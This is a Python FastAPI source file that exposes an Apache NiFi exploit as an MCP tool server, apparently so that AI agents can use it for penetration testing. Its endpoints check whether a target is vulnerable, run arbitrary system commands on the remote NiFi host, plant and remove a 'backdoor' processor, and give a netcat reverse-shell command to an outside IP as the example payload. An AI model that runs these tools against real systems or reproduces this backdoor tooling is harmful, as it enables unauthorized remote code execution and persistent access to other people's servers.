import json
import logging
import os
from typing import Dict, Any

from fastapi import FastAPI, HTTPException, Query, Body
from fastapi.responses import StreamingResponse
from fastapi_mcp import FastApiMCP

from config import settings, Settings
from nifi_client import NiFiClient

# 配置日志
logging.basicConfig(
    level=getattr(logging, settings.log_level.upper()),
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# 验证必要配置
if not settings.validate_nifi_config():
    logger.error("NiFi 配置不完整，请检查环境变量")
    raise RuntimeError("NiFi 配置不完整")

app = FastAPI(
    title=settings.app_name,
    description="NiFi MCP Server for Security Testing",
    version=settings.app_version
)

mcp = FastApiMCP(app, name="NiFi MCP Server", description="NiFi MCP Server for Penetration Testing")
mcp.mount_http(app)  # MCP server


# 全局异常处理器
@app.exception_handler(HTTPException)
async def http_exception_handler(request, exc: HTTPException):
    """处理 HTTP 异常"""
    from fastapi.responses import JSONResponse
    logger.warning(f"HTTP exception: {exc.status_code} - {exc.detail}")
    return JSONResponse(
        status_code=exc.status_code,
        content={
            "error": {
                "code": exc.status_code,
                "message": exc.detail,
                "type": "http_error"
            }
        }
    )


@app.exception_handler(Exception)
async def general_exception_handler(request, exc: Exception):
    """处理未捕获的异常"""
    from fastapi.responses import JSONResponse
    logger.error(f"Unhandled exception: {type(exc).__name__}: {str(exc)}")
    return JSONResponse(
        status_code=500,
        content={
            "error": {
                "code": 500,
                "message": "Internal server error",
                "type": "server_error"
            }
        }
    )


@app.get("/health")
async def health_check() -> Dict[str, Any]:
    """健康检查端点"""
    try:
        # 测试 NiFi 连接
        client = NiFiClient(settings.nifi_base_url)
        is_vulnerable = client.check_is_vul()
        return {
            "status": "healthy",
            "service": settings.app_name,
            "version": settings.app_version,
            "nifi_url": settings.nifi_base_url,
            "vulnerable": is_vulnerable,
            "timestamp": os.getenv("TIMESTAMP", "")
        }
    except Exception as e:
        logger.error(f"Health check failed: {str(e)}")
        return {
            "status": "unhealthy",
            "service": settings.app_name,
            "version": settings.app_version,
            "error": str(e),
            "timestamp": os.getenv("TIMESTAMP", "")
        }


@app.post("/backdoor/create", operation_id="create_backdoor")
async def create_backdoor(
        nifi_url: str = Body(..., description="NiFi 服务器 URL", example="http://192.168.1.1:8080"),
        command: str = Body(..., description="后门命令", example="nc -e /bin/bash 192.168.1.129 1234")
) -> Dict[str, Any]:
    """
    开启后门 - 利用 NiFi 漏洞创建后门

    Args:
        nifi_url: NiFi 服务器 URL
        command: 要执行的后门命令

    Returns:
        Dict[str, Any]: 操作结果

    Raises:
        HTTPException: 创建后门失败时抛出
    """
    logger.info(f"Received backdoor creation request: nifi_url='{nifi_url}', command='{command}'")

    try:
        client = NiFiClient(nifi_url)

        # 检查目标是否漏洞
        if not client.check_is_vul():
            error_msg = "Target NiFi server is not vulnerable"
            logger.warning(error_msg)
            raise HTTPException(status_code=400, detail=error_msg)

        # 执行后门命令
        result = client.exploit(command)

        logger.info(f"Backdoor command executed successfully")
        return {
            "success": True,
            "message": "Backdoor created successfully",
            "nifi_url": nifi_url,
            "command": command,
            "result": result
        }

    except HTTPException:
        raise
    except Exception as e:
        error_msg = f"Error creating backdoor: {str(e)}"
        logger.error(error_msg)
        raise HTTPException(status_code=500, detail=error_msg)


@app.post("/backdoor/execute", operation_id="execute_command")
async def execute_command(
        nifi_url: str = Body(..., description="NiFi 服务器 URL", example="http://192.168.1.1:8080"),
        command: str = Body(..., description="要执行的命令", example="whoami")
) -> Dict[str, Any]:
    """
    通过后门发送命令 - 利用 NiFi 漏洞执行系统命令

    Args:
        nifi_url: NiFi 服务器 URL
        command: 要执行的系统命令

    Returns:
        Dict[str, Any]: 命令执行结果

    Raises:
        HTTPException: 执行命令失败时抛出
    """
    logger.info(f"Received command execution request: nifi_url='{nifi_url}', command='{command}'")

    try:
        client = NiFiClient(nifi_url)

        # 检查目标是否漏洞
        if not client.check_is_vul():
            error_msg = "Target NiFi server is not vulnerable"
            logger.warning(error_msg)
            raise HTTPException(status_code=400, detail=error_msg)

        # 执行命令
        result = client.exploit(command)

        logger.info(f"Command executed successfully")
        return {
            "success": True,
            "message": "Command executed successfully",
            "nifi_url": nifi_url,
            "command": command,
            "result": result
        }

    except HTTPException:
        raise
    except Exception as e:
        error_msg = f"Error executing command: {str(e)}"
        logger.error(error_msg)
        raise HTTPException(status_code=500, detail=error_msg)


@app.post("/backdoor/cleanup", operation_id="cleanup_backdoor")
async def cleanup_backdoor(
        nifi_url: str = Body(..., description="NiFi 服务器 URL", example="http://192.168.1.1:8080"),
        processor_id: str = Body(..., description="处理器 ID", example="processor-uuid-here")
) -> Dict[str, Any]:
    """
    关闭后门 - 清理 NiFi 中的恶意处理器

    Args:
        nifi_url: NiFi 服务器 URL
        processor_id: 要清理的处理器 ID

    Returns:
        Dict[str, Any]: 清理结果

    Raises:
        HTTPException: 清理后门失败时抛出
    """
    logger.info(f"Received backdoor cleanup request: nifi_url='{nifi_url}', processor_id='{processor_id}'")

    try:
        client = NiFiClient(nifi_url)

        # 清理处理器
        client.clean_up(processor_id)

        logger.info(f"Backdoor cleaned up successfully")
        return {
            "success": True,
            "message": "Backdoor cleaned up successfully",
            "nifi_url": nifi_url,
            "processor_id": processor_id
        }

    except HTTPException:
        raise
    except Exception as e:
        error_msg = f"Error cleaning up backdoor: {str(e)}"
        logger.error(error_msg)
        raise HTTPException(status_code=500, detail=error_msg)


# But if you re-run the setup, the new endpoints will now be exposed.
mcp.setup_server()

if __name__ == "__main__":
    logger.info(f"Starting {settings.app_name} v{settings.app_version}")
    logger.info(f"NiFi URL: {settings.nifi_base_url}")
    logger.info(f"Server will start on {settings.host}:{settings.port}")

    import uvicorn

    uvicorn.run(
        app,
        host=settings.host,
        port=settings.port,
        log_level=settings.log_level.lower()
    )